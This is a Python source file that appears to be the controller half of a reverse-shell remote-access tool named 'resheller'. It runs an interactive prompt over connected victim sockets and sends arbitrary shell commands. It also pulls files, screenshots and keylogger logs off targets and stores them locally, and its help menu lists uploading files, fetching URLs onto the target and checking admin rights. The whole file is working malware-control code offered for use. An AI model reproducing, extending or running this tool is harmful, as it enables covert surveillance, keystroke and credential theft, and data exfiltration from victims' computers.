#!/usr/bin/env python3
from base64 import b64decode
from json import dumps, loads
from os import path
from pathlib import Path
from time import strftime

from src.stdout.color import Color


class Shell:

    def __init__(self, ips, targets, sessions):
        self.ips = ips
        self.targets = targets
        self.target = targets[sessions]
        self.ip, _ = ips[sessions]
        self.time = strftime("%H.%M.%S")
        self.windows = self.get_os

    @staticmethod
    def make_dir(command):
        date = strftime("%Y.%m.%d")
        main_dir = path.join(str(Path.home()), ".resheller")
        _dir = path.join(main_dir, date, command)
        if not path.isdir(_dir):
            Path(_dir).mkdir(parents=True, exist_ok=True)
        return _dir

    def keylogger_dump(self):
        _dir = self.make_dir("logs")
        log_file = path.join(_dir, f"keylog_{self.time}.txt")
        logs = self.safe_recv()
        if logs[:3] == "[!]":
            print(Color(logs).b_red())
        else:
            with open(log_file, 'w') as log:
                log.write(logs)
            print(logs)
            print(Color(f"Saved {log_file}\n").grn())

    def download(self, command):
        _dir = self.make_dir("downloads")
        downloaded = path.join(_dir, f"{command[9:]}_{self.time}")
        with open(downloaded, 'wb') as file:
            file.write(b64decode(self.safe_recv()))
        print(Color(f'Saved {downloaded}\n').grn())

    def screenshot(self):
        _dir = self.make_dir("screenshots")
        screenshot = path.join(_dir, f"screenshot_{self.time}.png")
        image = self.safe_recv()
        image_decoded = b64decode(image)
        if image_decoded[:3] == "[!]":
            print(Color(image_decoded).b_red())
        else:
            with open(screenshot, "wb") as shot:
                shot.write(image_decoded)
                shot.close()
            print(Color(f"Saved {screenshot}\n").grn())

    def safe_recv(self):
        data = "".encode('utf-8')
        while True:
            try:
                data = data + self.target.recv(1024)
                return loads(data)
            except ValueError:
                continue

    def safe_send(self, data):
        json_data = dumps(data)
        self.target.send(json_data.encode('utf-8'))

    def print_stdout(self):
        stdout = self.safe_recv()
        if stdout[:3] == "[+]" and len(stdout) > 3:
            stdout = Color(f"{stdout}\n").b_grn()
        elif stdout == '[+]':
            return
        elif stdout[:3] == "[!]":
            stdout = Color(f"{stdout}\n").b_red()
        print(stdout)

    def get_path(self):
        slash = "/"
        self.safe_send("pwd")
        stdout = self.safe_recv()
        dir_list = stdout.split(slash)
        del dir_list[0]
        dir_list[-1] = dir_list[-1][:-1]
        if not len(dir_list):
            return slash
        dir_list[0] = "~"
        if len(dir_list) == 1:
            return f"{dir_list[0]}{slash}"
        simplified = path.join(dir_list[0], dir_list[1])
        if len(dir_list) == 2:
            return simplified
        if len(dir_list) >= 3:
            tilde = dir_list.pop(0)
            usr = dir_list.pop(0)
            simplified = path.join(tilde, usr)
            basename = dir_list.pop(-1)
            count = 0
            while count < len(dir_list):
                simplified = path.join(simplified, "..")
                count += 1
            return path.join(simplified, basename)

    def get_win_path(self):
        self.safe_send("cd")
        stdout = self.safe_recv()
        dir_list = stdout.split("\\")
        dir_list[-1] = dir_list[-1][:-2]
        dir_list[0] = "\\"
        if len(dir_list) == 1:
            return dir_list[0]
        if len(dir_list) == 2:
            return f"{dir_list[0]}{dir_list[1]}"
        if len(dir_list) == 3:
            return path.join("~", dir_list[2]).replace("/", "\\")
        if len(dir_list) >= 3:
            basename = dir_list.pop(-1)
            del dir_list[0:3]
            simplified = "~"
            count = 0
            while count < len(dir_list):
                simplified = path.join(simplified, "..").replace("/", "\\")
                count += 1
            return path.join(simplified, basename).replace("/", "\\")

    def get_os(self):
        self.safe_send("get_os")
        return self.safe_recv()

    def ps1(self):
        if self.windows:
            win_path = self.get_win_path()
        else:
            win_path = self.get_path()
        shell = (f'{Color("{").b_blu()}{Color("shell").b_red()}'
                 f'{Color("@").b_blu()}{Color(self.ip).b_red()}:'
                 f'{Color(win_path).b_grn()}{Color("}>").b_blu()} ')
        return input(shell)

    @staticmethod
    def help():
        help_options = (
            "\n"
            "Usage:"
            "\n"
            "help            --> print this help message\n"
            "download <path> --> download file from target\n"
            "upload <path>   --> upload file from target\n"
            "get <url>       --> download file from website to target\n"
            "screenshot      --> take screenshot on target\n"
            "check           --> check for admin privileges\n"
            "keylog <opt>    --> <start> --> start keylogger on target\n"
            "                    <dump>  --> retrieve logs from target\n"
            "quit            --> exit reverse shell\n"
        )
        print(Color(help_options).ylw())

    def exit_shell(self):
        self.target.close()
        self.targets.remove(self.target)
        self.ips.remove(self.ip)

    def shell(self):
        print(Color("[+] Connection Established\n").b_grn())
        while True:
            command = self.ps1()
            if command == "help":
                self.help()
                continue
            if command == "ls":
                command = "dir"
            self.safe_send(command)
            if command == 'quit':
                break
            elif command == "exit":
                self.exit_shell()
                break
            elif command[:14] == "keylogger dump":
                self.keylogger_dump()
            elif command[:8] == "download":
                self.download(command)
            elif command[:10] == "screenshot":
                self.screenshot()
            else:
                self.print_stdout()
